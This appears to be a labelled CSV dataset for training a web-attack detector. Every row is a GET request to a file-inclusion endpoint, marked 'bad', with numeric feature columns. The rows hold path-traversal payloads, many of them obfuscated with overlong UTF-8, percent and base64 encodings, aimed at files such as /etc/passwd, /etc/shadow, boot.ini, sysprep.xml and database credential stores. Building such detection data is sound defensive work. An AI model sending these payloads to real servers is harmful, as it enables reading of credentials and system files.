method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,,6,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®0x2fð€€®ð€€®0x2fð€€®ð€€®0x2fð€€®ð€€®0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^À/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../etc/shadow,,10,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^À¯À^À^À¯À^À^À¯À^À^À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..ø€€€¯..ø€€€¯..ø€€€¯..ø€€€¯etcø€€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..\windows\system32\drivers\etc\hosts,,0,1,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==,,0,0,0,0,0,0,11,bad
GET,/vulnerabilities/fi/?page=#,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..à€¯..à€¯..à€¯..à€¯..à€¯windowsà€¯system32à€¯driversà€¯etcà€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=./\/././\/././\/././\/././\/././\/././\/././\/.//etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®0x2fð€€®ð€€®0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÁ%pc0x2e0x2eÁ%pc0x2e0x2eÁ%pc0x2e0x2eÁ%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\../\../\../\../\../\../windows/system32/drivers/etc/hosts,,6,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.Áœ?.ÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.ÁwindowsÁsystem32ÁdriversÁetcÁhosts,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?\.?\.?\.?\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÁ¯ÀîÀîÁ¯ÀîÀîÁ¯etcÁ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/log/httpd-access.log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.ÁœÀ.À.ÁœÀ.À.Áœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®%uF025à€®à€®%uF025à€®à€®%uF025à€®à€®%uF025à€®à€®%uF025à€®à€®%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%5cð€€®ð€€®%5cð€€®ð€€®%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=C:/sysprep.xml,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=C:\wamp\apache2\logs\access.log,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=/%2e%2e/%2e%2e/%2e%2e/,,3,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÀ/etcÀ/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=......///......///......///......///boot.ini,,4,0,0,0,0,4,1,bad
GET,/vulnerabilities/fi/?page=À.À.À%9vÀ.À.À%9vÀ.À.À%9vÀ.À.À%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5c..%5c..%5c/etc/passwd,,0,3,2,1,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html,,7,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%5c?.%5c?.%5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.À%qfÀ.À.À%qfÀ.À.À%qfÀ.À.À%qfetcÀ%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnð€€¯%ÀnÀnð€€¯%ÀnÀnð€€¯%ÀnÀnð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../À¯..../À¯..../À¯..../À¯..../À¯boot.ini,,5,0,0,0,0,5,1,bad
GET,/vulnerabilities/fi/?page=../../../etc/issue,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eÁ%8s%2%e%2%eÁ%8s%2%e%2%eÁ%8setcÁ%8spasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnà€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÁ%uff0e%uff0eÁ%uff0e%uff0eÁ%uff0e%uff0eÁetcÁissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^%2fÀ^À^%2fÀ^À^%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\,,0,8,82,4,0,0,0,bad
GET,/vulnerabilities/fi/?page=??À/??À/??À/??À/??À/??À/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/0x2e0x2e\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5c..%5c..%5c..%5cetc%5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/usr/local/cpanel/logs/stats_log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=C:/windows/panther/unattend/sysprep.xml,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../..//etc/passwd,,7,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁ¯ÀþÀþÁ¯ÀþÀþÁ¯ÀþÀþÁ¯ÀþÀþÁ¯windowsÁ¯system32Á¯driversÁ¯etcÁ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html,,0,8,7,4,0,0,2,bad
GET,/vulnerabilities/fi/?page=........................................................................../../boot.ini,,2,0,0,0,0,1,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%c0%af%2%e%2%e%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%5c{FILE},,0,1,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.../.%2%f.../.%2%f.../.%2%f.../.%2%f.../.%2%fetc%2%fissue,,5,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.?ð€€¯.?ð€€¯.?ð€€¯.?ð€€¯.?ð€€¯.?ð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÁ¯0x2e0x2eÁ¯0x2e0x2eÁ¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../ð€€¯..../ð€€¯..../ð€€¯..../ð€€¯..../ð€€¯..../ð€€¯etcð€€¯passwd,,6,0,0,0,0,6,2,bad
GET,/vulnerabilities/fi/?page=/..\\\..\\\..\\\..\\\{FILE},,0,4,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=\..%uF025\..%uF025\..%uF025windows%uF025system32%uF025drivers%uF025etc%uF025hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/./\/././\/././\/././\/././\/./,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.../.0x5c.../.0x5c.../.0x5c.../.0x5c.../.0x5c.../.0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,6,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.0x5c.../.0x5c.../.0x5c.../.0x5c.../.0x5cetc0x5cissue,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.Á%8s?.Á%8s?.Á%8s?.Á%8setcÁ%8spasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®À%9vwindowsÀ%9vsystem32À%9vdriversÀ%9vetcÀ%9vhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9cetc%c1%9cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..Áœ..Áœ..Áœ..Áœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..///..///..///..///..///etc///issue,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^%bg%qfÀ^À^%bg%qfÀ^À^%bg%qfÀ^À^%bg%qfÀ^À^%bg%qfÀ^À^%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,,0,4,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eÀ%9v%2%e%2%eÀ%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../À¯..../À¯..../À¯..../À¯..../À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,5,0,0,0,0,5,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®À¯ø€€€®ø€€€®À¯ø€€€®ø€€€®À¯ø€€€®ø€€€®À¯ø€€€®ø€€€®À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%5%cetc%5%cissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Á¯ø€€€®ø€€€®Á¯ø€€€®ø€€€®Á¯ø€€€®ø€€€®Á¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®À%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..Áœ\..Áœ\..Áœ\..Áœ\..ÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%5cÀþÀþ%5cÀþÀþ%5cÀþÀþ%5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../Á%pc..../Á%pc..../Á%pc..../Á%pcetcÁ%pcpasswd,,4,0,0,0,0,4,2,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eð€€¯%2%e%2%eð€€¯%2%e%2%eð€€¯%2%e%2%eð€€¯windowsð€€¯system32ð€€¯driversð€€¯etcð€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%uEFC8etc%uEFC8passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/log/messages.1,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?%uF025.?%uF025.?%uF025.?%uF025.?%uF025.?%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Á%pcwindowsÁ%pcsystem32Á%pcdriversÁ%pcetcÁ%pchosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae0x5c%c0%ae%c0%ae0x5c%c0%ae%c0%ae0x5c%c0%ae%c0%ae0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..ð€€¯..ð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eÀ¯%2%e%2%eÀ¯%2%e%2%eÀ¯%2%e%2%eÀ¯%2%e%2%eÀ¯etcÀ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..À/..À/etcÀ/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..\boot.ini,,0,1,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/À.À.\{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eø€€€¯0x2e0x2eø€€€¯0x2e0x2eø€€€¯0x2e0x2eø€€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%5c..%5c..%5c..%5c..%5c..%5c{FILE},,0,6,5,3,0,0,0,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..ø€€€¯\..ø€€€¯\..ø€€€¯\..ø€€€¯windowsø€€€¯system32ø€€€¯driversø€€€¯etcø€€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?ø€€€¯.?ø€€€¯.?ø€€€¯windowsø€€€¯system32ø€€€¯driversø€€€¯etcø€€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/../{FILE},,1,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==,,0,0,0,0,0,0,22,bad
GET,/vulnerabilities/fi/?page=à€®à€®%2%fà€®à€®%2%fetc%2%fpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?%2fetc%2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.à€¯À.À.à€¯À.À.à€¯À.À.à€¯À.À.à€¯etcà€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../opt/lampp/logs/error_log,,15,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®%u2216à€®à€®%u2216à€®à€®%u2216à€®à€®%u2216à€®à€®%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..\..\..\..\..\boot.ini,,0,5,4,2,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../var/log/httpd/error_log,,5,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.%5%c?.%5%cetc%5%cissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À^À^%uEFC8À^À^%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/etc/mtab,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../Á%pcetcÁ%pcissue,,1,0,0,0,0,1,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ%qf%c0%ae%c0%aeÀ%qf%c0%ae%c0%aeÀ%qfwindowsÀ%qfsystem32À%qfdriversÀ%qfetcÀ%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=install.php,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%uF025%uff0e%uff0e%uF025%uff0e%uff0e%uF025%uff0e%uff0e%uF025%uff0e%uff0e%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??à€¯??à€¯??à€¯??à€¯??à€¯??à€¯windowsà€¯system32à€¯driversà€¯etcà€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?Á.?Á.?Á.?Áboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts,,2,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%2fetc%2fpasswd,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..\etc\passwd,,0,1,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.\À.À.\À.À.\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%c1%9c??%c1%9c??%c1%9c??%c1%9c??%c1%9c??%c1%9cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??0x5c??0x5c??0x5c??0x5c??0x5cetc0x5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror.l,,0,0,0,0,0,0,4,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%5c%c0%ae%c0%ae%5c%c0%ae%c0%ae%5c%c0%ae%c0%ae%5cetc%5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\\\../../../../../../boot.ini,,6,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÀ\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%u22150x2e0x2e%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeø€€€¯%c0%ae%c0%aeø€€€¯%c0%ae%c0%aeø€€€¯%c0%ae%c0%aeø€€€¯%c0%ae%c0%aeø€€€¯%c0%ae%c0%aeø€€€¯windowsø€€€¯system32ø€€€¯driversø€€€¯etcø€€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À®À®ÁÀ®À®ÁÀ®À®ÁÀ®À®Áboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..%2f..%2f..%2f..%2f..%2f{FILE},,5,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eø€€€¯%uff0e%uff0eø€€€¯%uff0e%uff0eø€€€¯%uff0e%uff0eø€€€¯%uff0e%uff0eø€€€¯etcø€€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ0x5cÀþÀþ0x5cÀþÀþ0x5cÀþÀþ0x5cÀþÀþ0x5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..../..../..../boot.ini,,3,0,0,0,0,3,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®%u2215ø€€€®ø€€€®%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%u2216..%u2216..%u2216..%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../etc/passwd,,14,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/etc/my.cnf,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../%2f..../%2f..../%2f..../%2fboot.ini,,4,0,0,0,0,4,1,bad
GET,/vulnerabilities/fi/?page=/À®À®ÁœÀ®À®ÁœÀ®À®ÁœÀ®À®Áœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=///../../../../../../../..//etc/passwd,,8,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../administrator/inbox,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/var/lib/mysql/mysql/user.MYD,,0,0,0,0,0,0,4,bad
GET,/vulnerabilities/fi/?page=..0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%5%cð€€®ð€€®%5%cð€€®ð€€®%5%cetc%5%cpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%c1%9c?.%c1%9cetc%c1%9cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/apache/apache.conf,,0,0,0,0,0,0,4,bad
GET,/vulnerabilities/fi/?page=à€®à€®ð€€¯à€®à€®ð€€¯à€®à€®ð€€¯à€®à€®ð€€¯à€®à€®ð€€¯windowsð€€¯system32ð€€¯driversð€€¯etcð€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%2%fetc%2%fpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2fetc%2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.À\.../.À\.../.À\.../.À\etcÀ\issue,,4,0,0,0,0,0,1,bad
